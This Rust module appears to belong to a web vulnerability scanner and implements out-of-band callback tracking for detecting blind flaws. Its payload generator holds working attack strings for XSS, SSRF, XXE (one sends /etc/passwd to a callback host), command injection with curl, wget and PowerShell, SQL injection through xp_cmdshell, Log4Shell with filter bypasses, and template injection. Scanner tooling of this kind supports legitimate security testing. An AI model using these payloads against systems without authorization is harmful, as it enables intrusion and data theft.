//! Out-of-Band (OOB) Interaction Service
//!
//! Provides Burp Collaborator / XSS Hunter-like functionality for detecting
//! blind vulnerabilities through DNS, HTTP, and SMTP callbacks.
//!
//! Supports multiple backends:
//! - Interactsh (ProjectDiscovery's open-source collaborator)
//! - Self-hosted webhook endpoints
//! - Custom DNS/HTTP servers

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, RwLock};
use std::time::{Duration, Instant};

mod interactsh;
pub use interactsh::InteractshClient;

/// Type of OOB interaction
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum InteractionType {
    /// DNS lookup
    Dns,
    /// HTTP/HTTPS request
    Http,
    /// SMTP connection
    Smtp,
    /// LDAP query
    Ldap,
    /// FTP connection
    Ftp,
    /// SMB connection
    Smb,
}

impl std::fmt::Display for InteractionType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Dns => write!(f, "DNS"),
            Self::Http => write!(f, "HTTP"),
            Self::Smtp => write!(f, "SMTP"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Ftp => write!(f, "FTP"),
            Self::Smb => write!(f, "SMB"),
        }
    }
}

/// A recorded OOB interaction
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Interaction {
    /// Unique identifier for the interaction
    pub id: String,
    /// Type of interaction (DNS, HTTP, etc.)
    pub interaction_type: InteractionType,
    /// Source IP address
    pub remote_address: String,
    /// Timestamp of the interaction
    pub timestamp: chrono::DateTime<chrono::Utc>,
    /// Raw data/payload received
    pub raw_data: Option<String>,
    /// HTTP request details (if HTTP interaction)
    pub http_request: Option<HttpInteraction>,
    /// DNS query details (if DNS interaction)
    pub dns_query: Option<DnsInteraction>,
    /// Correlation ID extracted from the subdomain
    pub correlation_id: String,
}

/// HTTP interaction details
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpInteraction {
    /// HTTP method
    pub method: String,
    /// Request path
    pub path: String,
    /// Request headers
    pub headers: HashMap<String, String>,
    /// Request body
    pub body: Option<String>,
}

/// DNS interaction details
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsInteraction {
    /// Query type (A, AAAA, CNAME, etc.)
    pub query_type: String,
    /// Queried domain
    pub domain: String,
}

/// Callback URL with correlation tracking
#[derive(Debug, Clone)]
pub struct CallbackUrl {
    /// The full URL to use in payloads
    pub url: String,
    /// DNS hostname for DNS-based detection
    pub hostname: String,
    /// Unique correlation ID for this callback
    pub correlation_id: String,
    /// When this callback was created
    pub created_at: Instant,
    /// Context about what this callback is testing
    pub context: CallbackContext,
}

/// Context for a callback URL
#[derive(Debug, Clone, Default)]
pub struct CallbackContext {
    /// Original request URL being tested
    pub target_url: Option<String>,
    /// Parameter being tested
    pub parameter: Option<String>,
    /// Vulnerability type being tested
    pub vuln_type: Option<String>,
    /// Template ID that generated this callback
    pub template_id: Option<String>,
}

/// OOB interaction client trait
pub trait OobClient: Send + Sync {
    /// Generate a unique callback URL for HTTP interactions
    fn generate_http_callback(&self, context: CallbackContext) -> Result<CallbackUrl>;

    /// Generate a unique callback hostname for DNS interactions
    fn generate_dns_callback(&self, context: CallbackContext) -> Result<CallbackUrl>;

    /// Poll for new interactions
    fn poll_interactions(&self) -> Result<Vec<Interaction>>;

    /// Get all interactions for a specific correlation ID
    fn get_interactions(&self, correlation_id: &str) -> Vec<Interaction>;

    /// Check if any interactions have been received for a correlation ID
    fn has_interaction(&self, correlation_id: &str) -> bool;

    /// Get the base domain for callbacks
    fn get_base_domain(&self) -> &str;
}

/// OOB interaction manager
pub struct OobManager {
    /// Active OOB client
    client: Option<Arc<dyn OobClient>>,
    /// Pending callbacks waiting for interactions
    pending_callbacks: Arc<RwLock<HashMap<String, CallbackUrl>>>,
    /// Received interactions indexed by correlation ID
    interactions: Arc<RwLock<HashMap<String, Vec<Interaction>>>>,
    /// Callback expiry duration
    callback_ttl: Duration,
}

impl OobManager {
    /// Create a new OOB manager without a client
    pub fn new() -> Self {
        Self {
            client: None,
            pending_callbacks: Arc::new(RwLock::new(HashMap::new())),
            interactions: Arc::new(RwLock::new(HashMap::new())),
            callback_ttl: Duration::from_secs(3600), // 1 hour default
        }
    }

    /// Create an OOB manager with an Interactsh client
    pub async fn with_interactsh(server_url: Option<&str>) -> Result<Self> {
        let client = InteractshClient::new(server_url).await?;
        Ok(Self {
            client: Some(Arc::new(client)),
            pending_callbacks: Arc::new(RwLock::new(HashMap::new())),
            interactions: Arc::new(RwLock::new(HashMap::new())),
            callback_ttl: Duration::from_secs(3600),
        })
    }

    /// Set callback TTL
    pub fn with_ttl(mut self, ttl: Duration) -> Self {
        self.callback_ttl = ttl;
        self
    }

    /// Check if OOB is available
    pub fn is_available(&self) -> bool {
        self.client.is_some()
    }

    /// Generate an HTTP callback URL
    pub fn generate_http_callback(&self, context: CallbackContext) -> Result<CallbackUrl> {
        let client = self.client.as_ref().context("OOB client not configured")?;
        let callback = client.generate_http_callback(context)?;

        // Track the pending callback
        if let Ok(mut pending) = self.pending_callbacks.write() {
            pending.insert(callback.correlation_id.clone(), callback.clone());
        }

        Ok(callback)
    }

    /// Generate a DNS callback hostname
    pub fn generate_dns_callback(&self, context: CallbackContext) -> Result<CallbackUrl> {
        let client = self.client.as_ref().context("OOB client not configured")?;
        let callback = client.generate_dns_callback(context)?;

        // Track the pending callback
        if let Ok(mut pending) = self.pending_callbacks.write() {
            pending.insert(callback.correlation_id.clone(), callback.clone());
        }

        Ok(callback)
    }

    /// Poll for new interactions
    pub async fn poll(&self) -> Result<Vec<Interaction>> {
        let client = self.client.as_ref().context("OOB client not configured")?;
        let new_interactions = client.poll_interactions()?;

        // Store interactions by correlation ID
        if let Ok(mut interactions) = self.interactions.write() {
            for interaction in &new_interactions {
                interactions
                    .entry(interaction.correlation_id.clone())
                    .or_default()
                    .push(interaction.clone());
            }
        }

        Ok(new_interactions)
    }

    /// Check if any interactions received for a correlation ID
    pub fn has_interaction(&self, correlation_id: &str) -> bool {
        if let Ok(interactions) = self.interactions.read() {
            return interactions.contains_key(correlation_id);
        }
        false
    }

    /// Get interactions for a correlation ID
    pub fn get_interactions(&self, correlation_id: &str) -> Vec<Interaction> {
        if let Ok(interactions) = self.interactions.read() {
            return interactions.get(correlation_id).cloned().unwrap_or_default();
        }
        Vec::new()
    }

    /// Get callback context for a correlation ID
    pub fn get_callback_context(&self, correlation_id: &str) -> Option<CallbackUrl> {
        if let Ok(pending) = self.pending_callbacks.read() {
            return pending.get(correlation_id).cloned();
        }
        None
    }

    /// Clean up expired callbacks
    pub fn cleanup_expired(&self) {
        let now = Instant::now();
        if let Ok(mut pending) = self.pending_callbacks.write() {
            pending.retain(|_, callback| now.duration_since(callback.created_at) < self.callback_ttl);
        }
    }

    /// Get base domain for generating payloads
    pub fn get_base_domain(&self) -> Option<&str> {
        self.client.as_ref().map(|c| c.get_base_domain())
    }
}

impl Default for OobManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Generate OOB payloads for various vulnerability types
pub struct OobPayloadGenerator;

impl OobPayloadGenerator {
    /// Generate blind XSS payloads with callback
    pub fn blind_xss_payloads(callback_url: &str) -> Vec<String> {
        vec![
            format!("<script src=\"{}\"></script>", callback_url),
            format!("<img src=\"{}\" onerror=\"this.src='{}'\">", callback_url, callback_url),
            format!("'><script src=\"{}\"></script>", callback_url),
            format!("\"><script src=\"{}\"></script>", callback_url),
            format!("javascript:fetch('{}')", callback_url),
            format!("<svg onload=\"fetch('{}')\">", callback_url),
            format!("{{{{constructor.constructor('fetch(`{}`)')()}}}}", callback_url),
        ]
    }

    /// Generate blind SSRF payloads with callback
    pub fn blind_ssrf_payloads(callback_hostname: &str) -> Vec<String> {
        vec![
            format!("http://{}", callback_hostname),
            format!("https://{}", callback_hostname),
            format!("//{}", callback_hostname),
            format!("http://{}/", callback_hostname),
            format!("http://{}:80/", callback_hostname),
            format!("http://{}:443/", callback_hostname),
            // DNS rebinding
            format!("http://{}.nip.io/", callback_hostname),
        ]
    }

    /// Generate blind XXE payloads with callback
    pub fn blind_xxe_payloads(callback_hostname: &str, callback_url: &str) -> Vec<String> {
        vec![
            // DNS exfiltration
            format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{}/">
]>
<root>&xxe;</root>"#,
                callback_hostname
            ),
            // HTTP exfiltration
            format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{}">
  %xxe;
]>
<root>test</root>"#,
                callback_url
            ),
            // Parameter entity OOB
            format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}/?data=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>"#,
                callback_hostname
            ),
        ]
    }

    /// Generate blind command injection payloads with callback
    pub fn blind_cmdi_payloads(callback_hostname: &str) -> Vec<String> {
        vec![
            // Ping (DNS lookup)
            format!("; nslookup {}", callback_hostname),
            format!("| nslookup {}", callback_hostname),
            format!("|| nslookup {}", callback_hostname),
            format!("& nslookup {}", callback_hostname),
            format!("&& nslookup {}", callback_hostname),
            format!("`nslookup {}`", callback_hostname),
            format!("$(nslookup {})", callback_hostname),
            // Curl/wget (HTTP callback)
            format!("; curl http://{}", callback_hostname),
            format!("| curl http://{}", callback_hostname),
            format!("; wget http://{}", callback_hostname),
            // PowerShell (Windows)
            format!("; powershell -c \"Invoke-WebRequest http://{}\"", callback_hostname),
            format!("| powershell -c \"Resolve-DnsName {}\"", callback_hostname),
        ]
    }

    /// Generate blind SQL injection payloads with callback (requires stacked queries or specific DB features)
    pub fn blind_sqli_oob_payloads(callback_hostname: &str) -> Vec<String> {
        vec![
            // MySQL (requires FILE privilege and outbound connections)
            format!(
                "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.{}\\\\a'))-- -",
                callback_hostname
            ),
            // PostgreSQL (requires pg_read_server_log or COPY)
            format!(
                "'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- -",
                callback_hostname
            ),
            // MSSQL (requires xp_cmdshell or xp_dirtree)
            format!("; EXEC master..xp_dirtree '\\\\{}\\a'-- -", callback_hostname),
            format!(
                "; EXEC master..xp_cmdshell 'nslookup {}'-- -",
                callback_hostname
            ),
            // Oracle (requires UTL_HTTP or UTL_INADDR)
            format!(
                "' || UTL_HTTP.REQUEST('http://{}') || '",
                callback_hostname
            ),
        ]
    }

    /// Generate Log4Shell payloads
    pub fn log4shell_payloads(callback_hostname: &str) -> Vec<String> {
        vec![
            format!("${{jndi:ldap://{}/a}}", callback_hostname),
            format!("${{jndi:rmi://{}/a}}", callback_hostname),
            format!("${{jndi:dns://{}}}", callback_hostname),
            // Bypass variations
            format!("${{${{lower:j}}ndi:ldap://{}/a}}", callback_hostname),
            format!("${{${{upper:j}}ndi:ldap://{}/a}}", callback_hostname),
            format!("${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{}/a}}", callback_hostname),
            format!("${{j${{:}}ndi:ldap://{}/a}}", callback_hostname),
            format!("${{jndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{}/a}}", callback_hostname),
        ]
    }

    /// Generate SSTI blind payloads
    pub fn blind_ssti_payloads(callback_hostname: &str) -> Vec<String> {
        vec![
            // Jinja2
            format!(
                "{{{{config.__class__.__init__.__globals__['os'].popen('nslookup {}').read()}}}}",
                callback_hostname
            ),
            // Twig
            format!("{{{{['nslookup {}']|filter('system')}}}}", callback_hostname),
            // Freemarker
            format!(
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"nslookup {}\")}}",
                callback_hostname
            ),
            // ERB
            format!("<%= `nslookup {}` %>", callback_hostname),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blind_xss_payloads() {
        let payloads = OobPayloadGenerator::blind_xss_payloads("http://test.oast.me");
        assert!(!payloads.is_empty());
        assert!(payloads[0].contains("test.oast.me"));
    }

    #[test]
    fn test_log4shell_payloads() {
        let payloads = OobPayloadGenerator::log4shell_payloads("test.oast.me");
        assert!(payloads.len() >= 5);
        assert!(payloads.iter().any(|p| p.contains("jndi:ldap")));
        assert!(payloads.iter().any(|p| p.contains("jndi:dns")));
    }

    #[test]
    fn test_blind_cmdi_payloads() {
        let payloads = OobPayloadGenerator::blind_cmdi_payloads("test.oast.me");
        assert!(payloads.iter().any(|p| p.contains("nslookup")));
        assert!(payloads.iter().any(|p| p.contains("curl")));
    }

    #[test]
    fn test_oob_manager_creation() {
        let manager = OobManager::new();
        assert!(!manager.is_available());
    }
}
